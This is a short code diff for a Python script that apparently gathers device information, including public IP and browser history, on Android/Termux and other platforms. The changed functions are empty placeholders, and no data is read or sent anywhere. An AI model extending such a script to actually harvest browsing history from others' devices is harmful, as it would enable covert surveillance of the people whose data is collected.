@@ -70,10 +70,18 @@ def get_public_ip():
     ip = execute_command('curl -s https://api64.ipify.org')
     return ip
 
-# Function to collect browser history (placeholder for Termux)
-def get_browser_history():
+# Function to get browser history for Termux (placeholder)
+def get_browser_history_termux():
     # Placeholder for Termux, as direct access to browser history databases is not simple
     return []
+
+# Function to collect browser history
+def get_browser_history():
+    if platform.system() == 'Linux' and 'Android' in platform.release():  # Assuming Termux on Android
+        return get_browser_history_termux()
+    else:
+        # Implement logic for other platforms if needed
+        return []
 
 # Function to collect all relevant information
 def collect_information():
